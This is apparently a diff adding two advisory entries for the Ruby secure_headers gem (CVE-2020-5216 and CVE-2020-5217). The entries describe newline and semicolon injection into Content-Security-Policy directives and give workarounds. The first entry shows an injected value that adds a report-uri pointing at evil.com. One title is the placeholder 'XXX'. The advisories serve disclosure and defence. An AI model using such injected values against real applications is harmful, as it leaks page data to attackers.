@@ -1,4 +1,110 @@
 ---
+- id: rubyadvisory:rubygems:secure_headers:CVE-2020-5216
+  title: secure_headers header injection due to newline
+  description: |-
+    If user-supplied input was passed into append/override_content_security_policy_directives,
+    a newline could be injected leading to limited header injection.
+
+    Upon seeing a newline in the header, rails will silently create a new Content-Security-Policy
+    header with the remaining value of the original string. It will continue to create new headers
+    for each newline.
+
+    e.g.
+
+    ```
+    override_content_security_directives(script_src: ['mycdn.com', "\ninjected\n"])
+    ```
+
+    would result in
+
+    ```
+    Content-Security-Policy: ... script-src: mycdn.com
+    Content-Security-Policy: injected
+    Content-Security-Policy: rest-of-the-header
+    ```
+
+    CSP supports multiple headers and all policies must be satisfied for execution to occur, but a malicious value that reports the current page is fairly trivial:
+
+    ```
+    override_content_security_directives(script_src: ["mycdn.com", "\ndefault-src 'none'; report-uri evil.com"])
+    ```
+
+    ```
+    Content-Security-Policy: ... script-src: mycdn.com
+    Content-Security-Policy: default-src 'none'; report-uri evil.com
+    Content-Security-Policy: rest-of-the-header
+    ```
+
+    Workarounds
+    ```
+    override_content_security_policy_directives(:frame_src, [user_input.gsub("\n", " ")])
+    ```
+  affected_package: secure_headers
+  patched_versions:
+  - ">= 6.3.0"
+  - "~> 3.9.0"
+  - "~> 5.2.0"
+  severity: medium
+  package_manager: rubygems
+  cve:
+  - CVE-2020-5216
+  cvss_v3_score: 4.4
+  disclosed_date: 2020-01-23
+  created_date: 2020-01-23
+  last_modified_date: 2020-01-23
+  credit:
+  - Rubysec
+  references:
+  - https://github.com/rubysec/ruby-advisory-db
+  source_url: https://github.com/twitter/secure_headers/security/advisories/GHSA-w978-rmpf-qmwg
+- id: rubyadvisory:rubygems:secure_headers:CVE-2020-5217
+  title: secure_headers XXX
+  description: |-
+    If user-supplied input was passed into append/override_content_security_policy_directives,
+    a semicolon could be injected leading to directive injection.
+
+    This could be used to e.g. override a script-src directive. Duplicate directives are ignored
+    and the first one wins. The directives in secure_headers are sorted alphabetically so they
+    pretty much all come before script-src. A previously undefined directive would receive a value
+    even if SecureHeaders::OPT_OUT was supplied.
+
+    The fixed versions will silently convert the semicolons to spaces and emit a deprecation warning
+    when this happens. This will result in innocuous browser console messages if being
+    exploited/accidentally used. In future releases, we will raise application errors resulting in
+    500s.
+
+    > Duplicate script-src directives detected. All but the first instance will be ignored.
+
+    See https://www.w3.org/TR/CSP3/#parse-serialized-policy
+
+    > Note: In this case, the user agent SHOULD notify developers that a duplicate directive was
+    > ignored. A console warning might be appropriate, for example.
+
+    # Workarounds
+
+    If you are passing user input into the above methods, you could filter out the input:
+
+    ```
+    override_content_security_policy_directives(:frame_src, [user_input.gsub(";", " ")])
+    ```
+  affected_package: secure_headers
+  patched_versions:
+  - ">= 6.2.0"
+  - "~> 3.8.0"
+  - "~> 5.1.0"
+  severity: medium
+  package_manager: rubygems
+  cve:
+  - CVE-2020-5217
+  cvss_v3_score: 4.4
+  disclosed_date: 2020-01-23
+  created_date: 2020-01-23
+  last_modified_date: 2020-01-23
+  credit:
+  - Rubysec
+  references:
+  - https://github.com/rubysec/ruby-advisory-db
+  source_url: https://github.com/twitter/secure_headers/security/advisories/GHSA-xq52-rv6w-397c
 - id: snykio:rubygems:secure_headers:543239
   title: Command Injection
   description: |
